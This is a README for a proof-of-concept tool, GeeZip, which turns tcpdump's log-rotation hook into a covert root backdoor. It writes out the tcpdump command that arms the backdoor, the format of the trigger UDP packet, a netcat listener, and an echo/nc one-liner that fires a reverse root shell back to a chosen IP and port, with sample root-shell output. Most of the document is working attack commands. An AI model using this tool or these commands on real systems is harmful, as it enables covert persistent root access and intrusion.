# GeeZip

This is a proof of concept tool for abusing the logrotate functionality in tcpdump to execute a remote root shell.

## Building

Download and build geezip:

```
$ go get github.com/klustic/geezip
```

## Usage
GeeZip is designed to execute after a specially crafted UDP packet is received. The UDP packet must be in the following format:

```
+========+====+==+
|   K    | IP |P |
+========+====+==+

Where:
K : 8-byte sequence representing a secret key
IP: 4-byte sequence representing the callback IP
P : 2-byte sequence representing the callback port (big-endian)
```

On the commandline, run this command to prepare your tcpdump backdoor:
```
[root]# tcpdump -Uw output.pcap -z geezip -c 1 -G1 -i lo0 "udp[8:4]=0x6d616769 && udp[12:4]=0x636b6579"
```

On another commandline, prepare netcat to catch the reverse shell:
```
[user]$ nc -nvvl 8000
```

Finally, execute this from a third commandline to trigger the logrotate:
```
[user]$ echo -n 'magickey\x7f\x00\x00\x01\x1f\x40' | nc -u 127.0.0.1 53
```

You should see output from the `id` command on your netcat terminal, and should be able to interact with the backdoor:
```
[user]$ nc -nvvl 8000
Received trigger packet with key=6d616769636b6579, spawning a shell...
bash: no job control in this shell
bash-3.2# id
id
uid=0(root) gid=0(wheel) groups=0(wheel),...
bash-3.2#
```

## Thanks
This uses Google's epic [gopacket project](https://github.com/google/gopacket)
